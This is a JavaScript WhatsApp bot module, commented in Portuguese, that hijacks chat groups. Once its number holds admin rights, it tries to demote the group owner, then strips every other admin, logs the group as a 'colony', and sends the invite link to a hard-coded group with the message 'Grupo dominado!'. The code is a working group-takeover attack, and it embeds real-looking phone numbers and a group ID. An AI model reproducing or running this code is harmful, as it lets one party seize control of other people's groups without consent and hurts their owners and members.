module.exports = async function (client, message) {
    if ( await message.isGroupMsg ) {
        const fs = require('fs');
        const filePath = path.join('public', 'data', 'general', 'colony.json');
        const fileBuffer = fs.readFileSync(filePath);
        const fileJson = JSON.parse(fileBuffer);
        let register = fileJson;
        
        let isColony = false;
        register.forEach((element) => {
            if ( element.chatId === message.chatId) {
                isColony = true;
            }
        });

        if ( !isColony ) {
            let isAdm = false;
            let haveOwnerAdm = false;
            const resenhazordPhone = "5528999652953";
            const nameGroup = await message.chat.name;
            const resenhaId = "5528999670808-1558280621@g.us";
            const ownerAdm = await message.chat.groupMetadata.owner;

            const admList = await client.getGroupAdmins (await message.chatId);
            admList.forEach(element => {
                if (element.user === resenhazordPhone ) {
                    isAdm = true;
                }
            });

            if ( isAdm ) {
                admList.forEach(element => {
                    if ((element.user + "@c.us") === ownerAdm ) {
                        haveOwnerAdm = true;
                    }
                });
                if ( haveOwnerAdm ) {
                    await client.demoteParticipant(await message.chatId, ownerAdm);
                    console.log(`\n\nTentei tirar o dono ${ownerAdm} em ${nameGroup}\n`);
                    const newAdmList = await client.getGroupAdmins(await message.chatId);
                    newAdmList.forEach(element => {
                        if ( (element.user + "@c.us") === ownerAdm ){
                            haveOwnerAdm = true;
                            console.log(`\n\nNão consegui tirar o dono ${ownerAdm} em ${nameGroup}\n`);
                        }
                    });
                }
                if ( !haveOwnerAdm ) {
                    console.log(`\n\nNão tem o dono ${ownerAdm} em ${nameGroup}\n`);
                    const newAdmList = await client.getGroupAdmins(await message.chatId);
                    newAdmList.forEach(async (element) => {
                        if ( element.user != resenhazordPhone ) {
                            await client.demoteParticipant(await message.chatId, (element.user + "@c.us"));
                        } 
                    });
                    register.push({"chatId": message.chatId});
                    const fileString = JSON.stringify(register, null, '\t');
                    fs.writeFileSync(filePath, fileString, 'utf-8');
                    const linkGroup = await client.getGroupInviteLink(await message.chatId);
                    await client.sendLinkPreview(resenhaId, linkGroup,`\nGrupo dominado!\n`, `*_${nameGroup}_*`);
                }
            }
        }
    }
}